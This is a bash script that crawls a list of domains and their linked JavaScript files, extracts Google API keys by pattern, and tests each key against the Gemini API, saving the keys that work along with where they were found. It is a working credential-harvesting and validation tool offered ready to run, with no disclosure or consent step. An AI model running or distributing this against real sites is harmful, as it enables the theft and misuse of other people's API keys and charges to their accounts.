#!/bin/bash

INPUT=$1
OUT="gemini_exposed.txt"
TMP="all_keys.txt"

rm -f $OUT $TMP

echo "[+] Starting scan..."

fetch_and_extract() {

    URL=$1

    echo "[*] Crawling $URL"

    HTML=$(curl -ksL --max-time 10 $URL)

    # Extract keys from HTML
    echo "$HTML" | grep -oE 'AIza[0-9A-Za-z\-_]{35}' | while read key; do
        echo "$key | $URL (HTML)" >> $TMP
    done

    # Extract JS links
    JS=$(echo "$HTML" | grep -oE '(src|href)=["'\'']([^"'\'']+\.js)' | cut -d'"' -f2)

    for js in $JS; do

        if [[ $js == http* ]]; then
            JSURL=$js
        else
            JSURL="$URL/$js"
        fi

        JSBODY=$(curl -ksL --max-time 10 $JSURL)

        echo "$JSBODY" | grep -oE 'AIza[0-9A-Za-z\-_]{35}' | while read key; do
            echo "$key | $JSURL (JS)" >> $TMP
        done

    done
}

while read domain; do
    fetch_and_extract $domain
done < $INPUT

sort -u $TMP > uniq_keys.txt

echo "[+] Found $(wc -l < uniq_keys.txt) keys"
echo "[+] Testing Gemini access..."

while IFS="|" read key location; do

    KEY=$(echo $key | xargs)

    resp=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models?key=$KEY")

    if echo "$resp" | grep -q "models"; then
        echo "[!!!] GEMINI ENABLED → $KEY"
        echo "$KEY | Found at: $location" >> $OUT
    fi

done < uniq_keys.txt

echo ""
echo "[+] Done"
echo "[+] Results saved in: $OUT"
